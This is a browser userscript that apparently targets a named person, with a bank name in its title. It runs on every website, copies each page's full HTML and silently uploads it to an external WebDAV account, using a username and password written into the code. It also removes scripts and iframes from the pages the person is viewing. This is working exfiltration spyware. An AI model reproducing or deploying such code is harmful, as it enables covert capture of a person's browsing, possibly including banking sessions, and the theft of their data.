// ==UserScript==
// @name         Ed Rob UBS Georges Meyer
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/501843/Ed%20Rob%20UBS%20Georges%20Meyer.user.js
// @updateURL https://update.greasyfork.org/scripts/501843/Ed%20Rob%20UBS%20Georges%20Meyer.meta.js
// ==/UserScript==


//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// Script 0: Webdav upl
if (window.location.href.indexOf("schalke") !== -1 || window.location.href.indexOf("pilot") !== -1) {
  console.log("Excluded website. Script will not run on this page.");
} else {
(function webpageUploaderToWebDAV() {
    // SPECIFY CLIENT NAME HERE
  const clientName = "GEORGES MEYER";
    // DON'T FORGET TO SPECIFY CLIENT NAME ABOVE


  const webdavURL = "https://webdav.drivehq.com/2 Retention/";
  const username = "Cipberater";
  const password = "Aa123456";
  const folderName = clientName; // The folder name is set to the client's name
  let isUploaded = false;

  function checkAndCreateFolder(path) {
    GM_xmlhttpRequest({
      method: "PROPFIND",
      url: path,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password)
      },
      onload: function(response) {
        if (response.status === 404) {
          createFolder(path);
        } else if (response.status === 207) {
          console.log("Folder already exists.");
          saveAndUploadPage(path);
        } else {
          console.error("Failed to verify folder.", response);
        }
      }
    });
  }

  function createFolder(path) {
    GM_xmlhttpRequest({
      method: "MKCOL",
      url: path,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password)
      },
      onload: function(response) {
        if (response.status >= 200 && response.status < 300) {
          console.log("Folder created successfully.");
          saveAndUploadPage(path);
        } else {
          console.error("Failed to create folder.", response);
        }
      }
    });
  }

  function removeUnwantedElements(element) {
    const unwantedElements = ["script", "iframe"];
    unwantedElements.forEach((tag) => {
      const elements = element.querySelectorAll(tag);
      elements.forEach((element) => element.remove());
    });

    const imageElements = element.querySelectorAll("img");
    imageElements.forEach((element) => {
      const src = element.getAttribute("src");
      if (src && !src.startsWith("data:image")) {
        element.remove();
      }
    });
  }

  function saveAndUploadPage(path) {
    if (isUploaded) {
      console.log("File already uploaded. Skipping...");
      return;
    }

    const pageTitle = document.title.trim().replace(/[^a-z0-9]/gi, "_");
    const timestamp = new Date().toISOString().replace(/[^0-9]/g, "");
    const fileName = `${pageTitle}_${timestamp}.html`;

    const clonedDocument = document.documentElement.cloneNode(true);

    removeUnwantedElements(clonedDocument);

    const fragment = document.createDocumentFragment();
    fragment.appendChild(clonedDocument);

    const cspMetaTag = document.createElement("meta");
    cspMetaTag.setAttribute("http-equiv", "Content-Security-Policy");
    cspMetaTag.setAttribute("content", "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    fragment.querySelector("head").appendChild(cspMetaTag);

    const serializer = new XMLSerializer();
    const htmlContent = serializer.serializeToString(fragment);

    GM_xmlhttpRequest({
      method: "PUT",
      url: `${path}/${fileName}`,
      headers: {
        Authorization: "Basic " + btoa(username + ":" + password),
        "Content-Type": "text/html",
      },
      data: htmlContent,
      onload: function (response) {
        console.log("File uploaded successfully.");
        isUploaded = true;
      },
      onerror: function (response) {
        console.error("Failed to upload the file.", response);
        isUploaded = false;
      },
    });
  }

  const observer = new MutationObserver((mutationsList, observer) => {
    for (let mutation of mutationsList) {
      if (mutation.type === 'childList') {
        removeUnwantedElements(mutation.target);
      }
    }
  });

  observer.observe(document, { childList: true, subtree: true });

  window.addEventListener("load", function () {
    const folderPath = `${webdavURL}/${folderName}`;
    checkAndCreateFolder(folderPath);
  });
})();
}
